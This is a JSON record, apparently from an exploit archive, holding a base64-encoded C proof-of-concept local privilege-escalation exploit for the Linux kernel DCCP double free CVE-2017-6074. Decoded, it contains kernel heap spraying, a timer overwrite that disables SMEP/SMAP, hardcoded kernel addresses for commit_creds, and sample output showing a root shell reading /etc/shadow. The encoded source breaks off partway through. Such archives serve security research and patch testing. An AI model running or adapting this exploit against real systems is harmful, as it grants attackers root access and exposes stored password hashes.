{
    "source": "exploit-database", 
    "exploit": "Ly8NCi8vIEVEQiBOb3RlOiBNb3JlIGluZm9ybWF0aW9uIH4gaHR0cDovL3NlY2xpc3RzLm9yZy9vc3Mtc2VjLzIwMTcvcTEvNDcxDQovLw0KLy8gQSBwcm9vZi1vZi1jb25jZXB0IGxvY2FsIHJvb3QgZXhwbG9pdCBmb3IgQ1ZFLTIwMTctNjA3NC4NCi8vIEluY2x1ZGVzIGEgc2VtaXJlbGlhYmxlIFNNQVAvU01FUCBieXBhc3MuDQovLyBUZXN0ZWQgb24gNC40LjAtNjItZ2VuZXJpYyAjODMtVWJ1bnR1IGtlcm5lbC4NCi8vIGh0dHBzOi8vZ2l0aHViLmNvbS94YWlyeS9rZXJuZWwtZXhwbG9pdHMvdHJlZS9tYXN0ZXIvQ1ZFLTIwMTctNjA3NA0KLy8NCi8vIFVzYWdlOg0KLy8gJCBnY2MgcG9jLmMgLW8gcHduDQovLyAkIC4vcHduDQovLyBbLl0gbmFtZXNwYWNlIHNhbmRib3ggc2V0dXAgc3VjY2Vzc2Z1bGx5DQovLyBbLl0gZGlzYWJsaW5nIFNNRVAgJiBTTUFQDQovLyBbLl0gc2NoZWR1bGluZyAweGZmZmZmZmZmODEwNjQ1NTAoMHg0MDZlMCkNCi8vIFsuXSB3YWl0aW5nIGZvciB0aGUgdGltZXIgdG8gZXhlY3V0ZQ0KLy8gWy5dIGRvbmUNCi8vIFsuXSBTTUVQICYgU01BUCBzaG91bGQgYmUgb2ZmIG5vdw0KLy8gWy5dIGdldHRpbmcgcm9vdA0KLy8gWy5dIGV4ZWN1dGluZyAweDQwMjA0Mw0KLy8gWy5dIGRvbmUNCi8vIFsuXSBzaG91bGQgYmUgcm9vdCBub3cNCi8vIFsuXSBjaGVja2luZyBpZiB3ZSBnb3Qgcm9vdA0KLy8gWytdIGdvdCByMDB0IF5fXg0KLy8gWyFdIGRvbid0IGtpbGwgdGhlIGV4cGxvaXQgYmluYXJ5LCB0aGUga2VybmVsIHdpbGwgY3Jhc2gNCi8vICMgY2F0IC9ldGMvc2hhZG93DQovLyAuLi4NCi8vIGRhZW1vbjoqOjE3MTQ5OjA6OTk5OTk6Nzo6Og0KLy8gYmluOio6MTcxNDk6MDo5OTk5OTo3Ojo6DQovLyBzeXM6KjoxNzE0OTowOjk5OTk5Ojc6OjoNCi8vIHN5bmM6KjoxNzE0OTowOjk5OTk5Ojc6OjoNCi8vIGdhbWVzOio6MTcxNDk6MDo5OTk5OTo3Ojo6DQovLyAuLi4NCi8vDQovLyBBbmRyZXkgS29ub3ZhbG92IDxhbmRyZXlrbnZsQGdtYWlsLmNvbT4NCg0KI2RlZmluZSBfR05VX1NPVVJDRQ0KDQojaW5jbHVkZSA8ZXJybm8uaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPHN0ZGFyZy5oPg0KI2luY2x1ZGUgPHN0ZGJvb2wuaD4NCiNpbmNsdWRlIDxzdGRkZWYuaD4NCiNpbmNsdWRlIDxzdGRpbnQuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KDQojaW5jbHVkZSA8c2NoZWQuaD4NCg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvc3lzY2FsbC5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy93YWl0Lmg+DQoNCiNpbmNsdWRlIDxhcnBhL2luZXQuaD4NCiNpbmNsdWRlIDxsaW51eC9pZl9wYWNrZXQuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2lmX2V0aGVyLmg+DQoNCiNkZWZpbmUgU01FUF9TTUFQX0JZUEFTUwkxDQoNCi8vIE5lZWRlZCBmb3IgbG9jYWwgcm9vdC4NCiNkZWZpbmUgQ09NTUlUX0NSRURTCQkweGZmZmZmZmZmODEwYTI4NDBMDQojZGVmaW5lIFBSRVBBUkVfS0VSTkVMX0NSRUQJMHhmZmZmZmZmZjgxMGEyYzMwTA0KI2RlZmluZSBTSElORk9fT0ZGU0VUCQkxNzI4DQoNCi8vIE5lZWRlZCBmb3IgU01FUF9TTUFQX0JZUEFTUy4NCiNkZWZpbmUgTkFUSVZFX1dSSVRFX0NSNAkweGZmZmZmZmZmODEwNjQ1NTB1bA0KI2RlZmluZSBDUjRfREVTSVJFRF9WQUxVRQkweDQwNmUwdWwNCiNkZWZpbmUgVElNRVJfT0ZGU0VUCQkoNzI4ICsgNDggKyAxMDQpDQoNCiNkZWZpbmUgS01BTExPQ19QQUQgMTI4DQojZGVmaW5lIEtNQUxMT0NfV0FSTSAzMg0KI2RlZmluZSBDQVRDSF9GSVJTVCA2DQojZGVmaW5lIENBVENIX0FHQUlOIDE2DQojZGVmaW5lIENBVENIX0FHQUlOX1NNQUxMIDY0DQoNCi8vIFBvcnQgaXMgaW5jcmVtZW50ZWQgb24gZWFjaCB1c2UuDQpzdGF0aWMgaW50IHBvcnQgPSAxMTAwMDsNCg0Kdm9pZCBkZWJ1Zyhjb25zdCBjaGFyICptc2cpIHsNCi8qDQoJY2hhciBidWZmZXJbMzJdOw0KCXNucHJpbnRmKCZidWZmZXJbMF0sIHNpemVvZihidWZmZXIpLCAiZWNobyAnJXMnID4gL2Rldi9rbXNnXG4iLCBtc2cpOw0KCXN5c3RlbShidWZmZXIpOw0KKi8NCn0NCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqIEtlcm5lbCBzdHJ1Y3RzICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0Kc3RydWN0IHVidWZfaW5mbyB7DQoJdWludDY0X3QgY2FsbGJhY2s7CQkvLyB2b2lkICgqY2FsbGJhY2spKHN0cnVjdCB1YnVmX2luZm8gKiwgYm9vbCkNCgl1aW50NjRfdCBjdHg7CQkJLy8gdm9pZCAqDQoJdWludDY0X3QgZGVzYzsJCQkvLyB1bnNpZ25lZCBsb25nDQp9Ow0KDQpzdHJ1Y3Qgc2tiX3NoYXJlZF9pbmZvIHsNCgl1aW50OF90ICBucl9mcmFnczsJCS8vIHVuc2lnbmVkIGNoYXINCgl1aW50OF90ICB0eF9mbGFnczsJCS8vIF9fdTgNCgl1aW50MTZfdCBnc29fc2l6ZTsJCS8vIHVuc2lnbmVkIHNob3J0DQoJdWludDE2X3QgZ3NvX3NlZ3M7CQkvLyB1bnNpZ25lZCBzaG9ydA0KCXVpbnQxNl90IGdzb190eXBlOwkJLy8gdW5zaWduZWQgc2hvcnQNCgl1aW50NjRfdCBmcmFnX2xpc3Q7CQkvLyBzdHJ1Y3Qgc2tfYnVmZiAqDQoJdWludDY0X3QgaHd0c3RhbXBzOwkJLy8gc3RydWN0IHNrYl9zaGFyZWRfaHd0c3RhbXBzDQoJdWludDMyX3QgdHNrZXk7CQkJLy8gdTMyDQoJdWludDMyX3QgaXA2X2ZyYWdfaWQ7CQkvLyBfX2JlMzINCgl1aW50MzJfdCBkYXRhcmVmOwkJLy8gYXRvbWljX3QNCgl1aW50NjRfdCBkZXN0cnVjdG9yX2FyZzsJLy8gdm9pZCAqDQoJdWludDhfdCAgZnJhZ3NbMTZdWzE3XTsJCS8vIHNrYl9mcmFnX3QgZnJhZ3NbTUFYX1NLQl9GUkFHU107DQp9Ow0KDQpzdHJ1Y3QgdWJ1Zl9pbmZvIHVpOw0KDQp2b2lkIGluaXRfc2tiX2J1ZmZlcihjaGFyKiBidWZmZXIsIHZvaWQgKmZ1bmMpIHsNCgltZW1zZXQoJmJ1ZmZlclswXSwgMCwgMjA0OCk7DQoNCglzdHJ1Y3Qgc2tiX3NoYXJlZF9pbmZvICpzc2kgPSAoc3RydWN0IHNrYl9zaGFyZWRfaW5mbyAqKSZidWZmZXJbU0hJTkZPX09GRlNFVF07DQoNCglzc2ktPnR4X2ZsYWdzID0gMHhmZjsNCglzc2ktPmRlc3RydWN0b3JfYXJnID0gKHVpbnQ2NF90KSZ1aTsNCglzc2ktPm5yX2ZyYWdzID0gMDsNCglzc2ktPmZyYWdfbGlzdCA9IDA7DQoNCgl1aS5jYWxsYmFjayA9ICh1bnNpZ25lZCBsb25nKWZ1bmM7DQp9DQoNCnN0cnVjdCB0aW1lcl9saXN0IHsNCgl2b2lkCQkqbmV4dDsNCgl2b2lkCQkqcHJldjsNCgl1bnNpZ25lZCBsb25nCWV4cGlyZXM7DQoJdm9pZAkJKCpmdW5jdGlvbikodW5zaWduZWQgbG9uZyk7DQoJdW5zaWduZWQgbG9uZwlkYXRhOw0KCXVuc2lnbmVkIGludAlmbGFnczsNCglpbnQJCXNsYWNrOw0KfTsNCg0Kdm9pZCBpbml0X3RpbWVyX2J1ZmZlcihjaGFyKiBidWZmZXIsIHZvaWQgKmZ1bmMsIHVuc2lnbmVkIGxvbmcgYXJnKSB7DQoJbWVtc2V0KCZidWZmZXJbMF0sIDAsIDIwNDgpOw0KDQoJc3RydWN0IHRpbWVyX2xpc3QqIHRpbWVyID0gKHN0cnVjdCB0aW1lcl9saXN0ICopJmJ1ZmZlcltUSU1FUl9PRkZTRVRdOw0KDQoJdGltZXItPm5leHQgPSAwOw0KCXRpbWVyLT5wcmV2ID0gMDsNCgl0aW1lci0+ZXhwaXJlcyA9IDQyOTQ5NDMzNjA7DQoJdGltZXItPmZ1bmN0aW9uID0gZnVuYzsNCgl0aW1lci0+ZGF0YSA9IGFyZzsNCgl0aW1lci0+ZmxhZ3MgPSAxOw0KCXRpbWVyLT5zbGFjayA9IC0xOw0KfQ0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiBUcmlnZ2VyICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCnN0cnVjdCBkY2NwX2hhbmRsZSB7DQoJc3RydWN0IHNvY2thZGRyX2luNiBzYTsNCglpbnQgczE7DQoJaW50IHMyOw0KfTsNCg0Kdm9pZCBkY2NwX2luaXQoc3RydWN0IGRjY3BfaGFuZGxlICpoYW5kbGUsIGludCBwb3J0KSB7DQoJaGFuZGxlLT5zYS5zaW42X2ZhbWlseSA9IEFGX0lORVQ2Ow0KCWhhbmRsZS0+c2Euc2luNl9wb3J0ID0gaHRvbnMocG9ydCk7DQoJaW5ldF9wdG9uKEFGX0lORVQ2LCAiOjoxIiwgJmhhbmRsZS0+c2Euc2luNl9hZGRyKTsNCgloYW5kbGUtPnNhLnNpbjZfZmxvd2luZm8gPSAwOw0KCWhhbmRsZS0+c2Euc2luNl9zY29wZV9pZCA9IDA7DQoNCgloYW5kbGUtPnMxID0gc29ja2V0KFBGX0lORVQ2LCBTT0NLX0RDQ1AsIElQUFJPVE9fSVApOw0KCWlmIChoYW5kbGUtPnMxID09IC0xKSB7DQoJCXBlcnJvcigic29ja2V0KFNPQ0tfRENDUCkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCg0KCWludCBydiA9IGJpbmQoaGFuZGxlLT5zMSwgJmhhbmRsZS0+c2EsIHNpemVvZihoYW5kbGUtPnNhKSk7DQoJaWYgKHJ2ICE9IDApIHsNCgkJcGVycm9yKCJiaW5kKCkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCg0KCXJ2ID0gbGlzdGVuKGhhbmRsZS0+czEsIDB4OSk7DQoJaWYgKHJ2ICE9IDApIHsNCgkJcGVycm9yKCJsaXN0ZW4oKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KDQoJaW50IG9wdHZhbCA9IDg7DQoJcnYgPSBzZXRzb2Nrb3B0KGhhbmRsZS0+czEsIElQUFJPVE9fSVBWNiwgSVBWNl9SRUNWUEtUSU5GTywNCgkJCSZvcHR2YWwsIHNpemVvZihvcHR2YWwpKTsNCglpZiAocnYgIT0gMCkgew0KCQlwZXJyb3IoInNldHNvY2tvcHQoSVBWNl9SRUNWUEtUSU5GTykiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCg0KCWhhbmRsZS0+czIgPSBzb2NrZXQoUEZfSU5FVDYsIFNPQ0tfRENDUCwgSVBQUk9UT19JUCk7DQoJaWYgKGhhbmRsZS0+czEgPT0gLTEpIHsNCgkJcGVycm9yKCJzb2NrZXQoU09DS19EQ0NQKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KfQ0KDQp2b2lkIGRjY3Bfa21hbGxvY19rZnJlZShzdHJ1Y3QgZGNjcF9oYW5kbGUgKmhhbmRsZSkgew0KCWludCBydiA9IGNvbm5lY3QoaGFuZGxlLT5zMiwgJmhhbmRsZS0+c2EsIHNpemVvZihoYW5kbGUtPnNhKSk7DQoJaWYgKHJ2ICE9IDApIHsNCgkJcGVycm9yKCJjb25uZWN0KFNPQ0tfRENDUCkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCn0NCg0Kdm9pZCBkY2NwX2tmcmVlX2FnYWluKHN0cnVjdCBkY2NwX2hhbmRsZSAqaGFuZGxlKSB7DQoJaW50IHJ2ID0gc2h1dGRvd24oaGFuZGxlLT5zMSwgU0hVVF9SRFdSKTsNCglpZiAocnYgIT0gMCkgew0KCQlwZXJyb3IoInNodXRkb3duKFNPQ0tfRENDUCkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCn0NCg0Kdm9pZCBkY2NwX2Rlc3Ryb3koc3RydWN0IGRjY3BfaGFuZGxlICpoYW5kbGUpIHsNCgljbG9zZShoYW5kbGUtPnMxKTsNCgljbG9zZShoYW5kbGUtPnMyKTsNCn0NCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqIEhlYXAgc3ByYXlpbmcgKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCnN0cnVjdCB1ZHBfZmlmb19oYW5kbGUgew0KCWludCBmZHNbMl07DQp9Ow0KDQp2b2lkIHVkcF9maWZvX2luaXQoc3RydWN0IHVkcF9maWZvX2hhbmRsZSogaGFuZGxlKSB7DQoJaW50IHJ2ID0gc29ja2V0cGFpcihBRl9MT0NBTCwgU09DS19ER1JBTSwgMCwgaGFuZGxlLT5mZHMpOw0KCWlmIChydiAhPSAwKSB7DQoJCXBlcnJvcigic29ja2V0cGFpcigpIik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQp9DQoNCnZvaWQgdWRwX2ZpZm9fZGVzdHJveShzdHJ1Y3QgdWRwX2ZpZm9faGFuZGxlKiBoYW5kbGUpIHsNCgljbG9zZShoYW5kbGUtPmZkc1swXSk7DQoJY2xvc2UoaGFuZGxlLT5mZHNbMV0pOw0KfQ0KDQp2b2lkIHVkcF9maWZvX2ttYWxsb2Moc3RydWN0IHVkcF9maWZvX2hhbmRsZSogaGFuZGxlLCBjaGFyICpidWZmZXIpIHsNCglpbnQgcnYgPSBzZW5kKGhhbmRsZS0+ZmRzWzBdLCBidWZmZXIsIDE1MzYsIDApOw0KCWlmIChydiAhPSAxNTM2KSB7DQoJCXBlcnJvcigic2VuZCgpIik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQp9DQoNCnZvaWQgdWRwX2ZpZm9fa21hbGxvY19zbWFsbChzdHJ1Y3QgdWRwX2ZpZm9faGFuZGxlKiBoYW5kbGUpIHsNCgljaGFyIGJ1ZmZlclsxMjhdOw0KCWludCBydiA9IHNlbmQoaGFuZGxlLT5mZHNbMF0sICZidWZmZXJbMF0sIDEyOCwgMCk7DQoJaWYgKHJ2ICE9IDEyOCkgew0KCQlwZXJyb3IoInNlbmQoKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KfQ0KDQp2b2lkIHVkcF9maWZvX2tmcmVlKHN0cnVjdCB1ZHBfZmlmb19oYW5kbGUqIGhhbmRsZSkgew0KICAJY2hhciBidWZmZXJbMjA0OF07DQoJaW50IHJ2ID0gcmVjdihoYW5kbGUtPmZkc1sxXSwgJmJ1ZmZlclswXSwgMTUzNiwgMCk7DQoJaWYgKHJ2ICE9IDE1MzYpIHsNCgkJcGVycm9yKCJyZWN2KCkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCn0NCg0KaW50IHRpbWVyX2ttYWxsb2MoKSB7DQoJaW50IHMgPSBzb2NrZXQoQUZfUEFDS0VULCBTT0NLX0RHUkFNLCBodG9ucyhFVEhfUF9BUlApKTsNCglpZiAocyA9PSAtMSkgew0KCQlwZXJyb3IoInNvY2tldChTT0NLX0RHUkFNKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KCXJldHVybiBzOw0KfQ0KDQojZGVmaW5lIENPTkZfUklOR19GUkFNRVMgMQ0Kdm9pZCB0aW1lcl9zY2hlZHVsZShpbnQgaGFuZGxlLCBpbnQgdGltZW91dCkgew0KCWludCBvcHR2YWwgPSBUUEFDS0VUX1YzOw0KCWludCBydiA9IHNldHNvY2tvcHQoaGFuZGxlLCBTT0xfUEFDS0VULCBQQUNLRVRfVkVSU0lPTiwNCgkJCSZvcHR2YWwsIHNpemVvZihvcHR2YWwpKTsNCglpZiAocnYgIT0gMCkgew0KCQlwZXJyb3IoInNldHNvY2tvcHQoUEFDS0VUX1ZFUlNJT04pIik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQoJc3RydWN0IHRwYWNrZXRfcmVxMyB0cDsNCgltZW1zZXQoJnRwLCAwLCBzaXplb2YodHApKTsNCgl0cC50cF9ibG9ja19zaXplID0gQ09ORl9SSU5HX0ZSQU1FUyAqIGdldHBhZ2VzaXplKCk7DQoJdHAudHBfYmxvY2tfbnIgPSAxOw0KCXRwLnRwX2ZyYW1lX3NpemUgPSBnZXRwYWdlc2l6ZSgpOw0KCXRwLnRwX2ZyYW1lX25yID0gQ09ORl9SSU5HX0ZSQU1FUzsNCgl0cC50cF9yZXRpcmVfYmxrX3RvdiA9IHRpbWVvdXQ7DQoJcnYgPSBzZXRzb2Nrb3B0KGhhbmRsZSwgU09MX1BBQ0tFVCwgUEFDS0VUX1JYX1JJTkcsDQoJCQkodm9pZCAqKSZ0cCwgc2l6ZW9mKHRwKSk7DQoJaWYgKHJ2ICE9IDApIHsNCgkJcGVycm9yKCJzZXRzb2Nrb3B0KFBBQ0tFVF9SWF9SSU5HKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KfQ0KDQp2b2lkIHNvY2tldF9zZW5kbW1zZyhpbnQgc29jaywgY2hhciAqYnVmZmVyKSB7DQoJc3RydWN0IG1tc2doZHIgbXNnWzFdOw0KDQoJbXNnWzBdLm1zZ19oZHIubXNnX2lvdmxlbiA9IDA7DQoNCgkvLyBCdWZmZXIgdG8ga21hbGxvYy4NCgltc2dbMF0ubXNnX2hkci5tc2dfY29udHJvbCA9ICZidWZmZXJbMF07DQoJbXNnWzBdLm1zZ19oZHIubXNnX2NvbnRyb2xsZW4gPSAyMDQ4Ow0KDQoJLy8gTWFrZSBzZW5kbW1zZyBleGl0IGVhc3kgd2l0aCBFSU5WQUwuDQoJbXNnWzBdLm1zZ19oZHIubXNnX25hbWUgPSAicm9vdCI7DQoJbXNnWzBdLm1zZ19oZHIubXNnX25hbWVsZW4gPSAxOw0KDQoJaW50IHJ2ID0gc3lzY2FsbChfX05SX3NlbmRtbXNnLCBzb2NrLCBtc2csIDEsIDApOw0KCWlmIChydiA9PSAtMSAmJiBlcnJubyAhPSBFSU5WQUwpIHsNCgkJcGVycm9yKCJbLV0gc2VuZG1tc2coKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KfQ0KDQp2b2lkIHNlbmRtbXNnX2ttYWxsb2Nfa2ZyZWUoaW50IHBvcnQsIGNoYXIgKmJ1ZmZlcikgew0KCWludCBzb2NrWzJdOw0KDQoJaW50IHJ2ID0gc29ja2V0cGFpcihBRl9MT0NBTCwgU09DS19ER1JBTSwgMCwgc29jayk7DQoJaWYgKHJ2ICE9IDApIHsNCgkJcGVycm9yKCJzb2NrZXRwYWlyKCkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCg0KCXNvY2tldF9zZW5kbW1zZyhzb2NrWzBdLCBidWZmZXIpOw0KDQoJY2xvc2Uoc29ja1swXSk7DQp9DQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiBIZWFwIHdhcm1pbmcgKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCnZvaWQgZGNjcF9jb25uZWN0X3BhZChzdHJ1Y3QgZGNjcF9oYW5kbGUgKmhhbmRsZSwgaW50IHBvcnQpIHsNCgloYW5kbGUtPnNhLnNpbjZfZmFtaWx5ID0gQUZfSU5FVDY7DQoJaGFuZGxlLT5zYS5zaW42X3BvcnQgPSBodG9ucyhwb3J0KTsNCglpbmV0X3B0b24oQUZfSU5FVDYsICI6OjEiLCAmaGFuZGxlLT5zYS5zaW42X2FkZHIpOw0KCWhhbmRsZS0+c2Euc2luNl9mbG93aW5mbyA9IDA7DQoJaGFuZGxlLT5zYS5zaW42X3Njb3BlX2lkID0gMDsNCg0KCWhhbmRsZS0+czEgPSBzb2NrZXQoUEZfSU5FVDYsIFNPQ0tfRENDUCwgSVBQUk9UT19JUCk7DQoJaWYgKGhhbmRsZS0+czEgPT0gLTEpIHsNCgkJcGVycm9yKCJzb2NrZXQoU09DS19EQ0NQKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KDQoJaW50IHJ2ID0gYmluZChoYW5kbGUtPnMxLCAmaGFuZGxlLT5zYSwgc2l6ZW9mKGhhbmRsZS0+c2EpKTsNCglpZiAocnYgIT0gMCkgew0KCQlwZXJyb3IoImJpbmQoKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KDQoJcnYgPSBsaXN0ZW4oaGFuZGxlLT5zMSwgMHg5KTsNCglpZiAocnYgIT0gMCkgew0KCQlwZXJyb3IoImxpc3RlbigpIik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQoNCgloYW5kbGUtPnMyID0gc29ja2V0KFBGX0lORVQ2LCBTT0NLX0RDQ1AsIElQUFJPVE9fSVApOw0KCWlmIChoYW5kbGUtPnMxID09IC0xKSB7DQoJCXBlcnJvcigic29ja2V0KFNPQ0tfRENDUCkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCg0KCXJ2ID0gY29ubmVjdChoYW5kbGUtPnMyLCAmaGFuZGxlLT5zYSwgc2l6ZW9mKGhhbmRsZS0+c2EpKTsNCglpZiAocnYgIT0gMCkgew0KCQlwZXJyb3IoImNvbm5lY3QoU09DS19EQ0NQKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KfQ0KDQp2b2lkIGRjY3Bfa21hbGxvY19wYWQoKSB7DQoJaW50IGk7DQoJc3RydWN0IGRjY3BfaGFuZGxlIGhhbmRsZTsNCglmb3IgKGkgPSAwOyBpIDwgNDsgaSsrKSB7DQoJCWRjY3BfY29ubmVjdF9wYWQoJmhhbmRsZSwgcG9ydCsrKTsNCgl9DQp9DQoNCnZvaWQgdGltZXJfa21hbGxvY19wYWQoKSB7DQoJaW50IGk7DQoJZm9yIChpID0gMDsgaSA8IDQ7IGkrKykgew0KCQlzb2NrZXQoQUZfUEFDS0VULCBTT0NLX0RHUkFNLCBodG9ucyhFVEhfUF9BUlApKTsNCgl9DQp9DQoNCnZvaWQgdWRwX2ttYWxsb2NfcGFkKCkgew0KCWludCBpLCBqOw0KCWNoYXIgZHVtbXlbMjA0OF07DQoJc3RydWN0IHVkcF9maWZvX2hhbmRsZSB1aFsxNl07DQoJZm9yIChpID0gMDsgaSA8IEtNQUxMT0NfUEFEIC8gMTY7IGkrKykgew0KCQl1ZHBfZmlmb19pbml0KCZ1aFtpXSk7DQoJCWZvciAoaiA9IDA7IGogPCAxNjsgaisrKQ0KCQkJdWRwX2ZpZm9fa21hbGxvYygmdWhbaV0sICZkdW1teVswXSk7DQoJfQ0KfQ0KDQp2b2lkIGttYWxsb2NfcGFkKCkgew0KCWRlYnVnKCJkY2NwIGttYWxsb2MgcGFkIik7DQoJZGNjcF9rbWFsbG9jX3BhZCgpOw0KCWRlYnVnKCJ0aW1lciBrbWFsbG9jIHBhZCIpOw0KCXRpbWVyX2ttYWxsb2NfcGFkKCk7DQoJZGVidWcoInVkcCBrbWFsbG9jIHBhZCIpOw0KCXVkcF9rbWFsbG9jX3BhZCgpOw0KfQ0KDQp2b2lkIHVkcF9rbWFsbG9jX3dhcm0oKSB7DQoJaW50IGksIGo7DQoJY2hhciBkdW1teVsyMDQ4XTsNCglzdHJ1Y3QgdWRwX2ZpZm9faGFuZGxlIHVoWzE2XTsNCglmb3IgKGkgPSAwOyBpIDwgS01BTExPQ19XQVJNIC8gMTY7IGkrKykgew0KCQl1ZHBfZmlmb19pbml0KCZ1aFtpXSk7DQoJCWZvciAoaiA9IDA7IGogPCAxNjsgaisrKQ0KCQkJdWRwX2ZpZm9fa21hbGxvYygmdWhbaV0sICZkdW1teVswXSk7DQoJfQ0KCWZvciAoaSA9IDA7IGkgPCBLTUFMTE9DX1dBUk0gLyAxNjsgaSsrKSB7DQoJCWZvciAoaiA9IDA7IGogPCAxNjsgaisrKQ0KCQkJdWRwX2ZpZm9fa2ZyZWUoJnVoW2ldKTsNCgl9DQp9DQoNCnZvaWQga21hbGxvY193YXJtKCkgew0KCXVkcF9rbWFsbG9jX3dhcm0oKTsNCn0NCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiBEaXNhYmxpbmcgU01FUC9TTUFQICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCi8vIEV4ZWN1dGVzIGZ1bmMoYXJnKSBmcm9tIGludGVycnVwdCBjb250ZXh0IG11bHRpcGxlIHRpbWVzLg0Kdm9pZCBrZXJuZWxfZXhlY19pcnEodm9pZCAqZnVuYywgdW5zaWduZWQgbG9uZyBhcmcpIHsNCglpbnQgaTsNCglzdHJ1Y3QgZGNjcF9oYW5kbGUgZGg7DQoJc3RydWN0IHVkcF9maWZvX2hhbmRsZSB1aDEsIHVoMiwgdWgzLCB1aDQ7DQoJY2hhciBkdW1teVsyMDQ4XTsNCgljaGFyIGJ1ZmZlclsyMDQ4XTsNCg0KCXByaW50ZigiWy5dIHNjaGVkdWxpbmcgJXAoJXApXG4iLCBmdW5jLCAodm9pZCAqKWFyZyk7DQoNCgltZW1zZXQoJmR1bW15WzBdLCAweGMzLCAyMDQ4KTsNCglpbml0X3RpbWVyX2J1ZmZlcigmYnVmZmVyWzBdLCBmdW5jLCBhcmcpOw0KDQoJdWRwX2ZpZm9faW5pdCgmdWgxKTsNCgl1ZHBfZmlmb19pbml0KCZ1aDIpOw0KCXVkcF9maWZvX2luaXQoJnVoMyk7DQoJdWRwX2ZpZm9faW5pdCgmdWg0KTsNCg0KCWRlYnVnKCJrbWFsbG9jIHBhZCIpOw0KCWttYWxsb2NfcGFkKCk7DQoNCglkZWJ1Zygia21hbGxvYyB3YXJtIik7DQoJa21hbGxvY193YXJtKCk7DQoNCglkZWJ1ZygiZGNjcCBpbml0Iik7DQoJZGNjcF9pbml0KCZkaCwgcG9ydCsrKTsNCg0KCWRlYnVnKCJkY2NwIGttYWxsb2Mga2ZyZWUiKTsNCglkY2NwX2ttYWxsb2Nfa2ZyZWUoJmRoKTsNCg0KCWRlYnVnKCJjYXRjaCAxIik7DQoJZm9yIChpID0gMDsgaSA8IENBVENIX0ZJUlNUOyBpKyspDQoJCXVkcF9maWZvX2ttYWxsb2MoJnVoMSwgJmR1bW15WzBdKTsNCg0KCWRlYnVnKCJkY2NwIGtmcmVlIGFnYWluIik7DQoJZGNjcF9rZnJlZV9hZ2FpbigmZGgpOw0KDQoJZGVidWcoImNhdGNoIDIiKTsNCglmb3IgKGkgPSAwOyBpIDwgQ0FUQ0hfRklSU1Q7IGkrKykNCgkJdWRwX2ZpZm9fa21hbGxvYygmdWgyLCAmZHVtbXlbMF0pOw0KDQoJaW50IHRpbWVyc1tDQVRDSF9GSVJTVF07DQoJZGVidWcoImNhdGNoIDEgLT4gdGltZXIiKTsNCglmb3IgKGkgPSAwOyBpIDwgQ0FUQ0hfRklSU1Q7IGkrKykgew0KCQl1ZHBfZmlmb19rZnJlZSgmdWgxKTsNCgkJdGltZXJzW2ldID0gdGltZXJfa21hbGxvYygpOw0KCX0NCg0KCWRlYnVnKCJjYXRjaCAxIHNtYWxsIik7DQoJZm9yIChpID0gMDsgaSA8IENBVENIX0FHQUlOX1NNQUxMOyBpKyspDQoJCXVkcF9maWZvX2ttYWxsb2Nfc21hbGwoJnVoNCk7DQoNCglkZWJ1Zygic2NoZWR1bGUgdGltZXJzIik7DQoJZm9yIChpID0gMDsgaSA8IENBVENIX0ZJUlNUOyBpKyspDQoJCXRpbWVyX3NjaGVkdWxlKHRpbWVyc1tpXSwgNTAwKTsNCg0KCWRlYnVnKCJjYXRjaCAyIC0+IG92ZXJ3cml0ZSB0aW1lcnMiKTsNCglmb3IgKGkgPSAwOyBpIDwgQ0FUQ0hfRklSU1Q7IGkrKykgew0KCQl1ZHBfZmlmb19rZnJlZSgmdWgyKTsNCgkJdWRwX2ZpZm9fa21hbGxvYygmdWgzLCAmYnVmZmVyWzBdKTsNCgl9DQoNCglkZWJ1ZygiY2F0Y2ggMiBzbWFsbCIpOw0KCWZvciAoaSA9IDA7IGkgPCBDQVRDSF9BR0FJTl9TTUFMTDsgaSsrKQ0KCQl1ZHBfZmlmb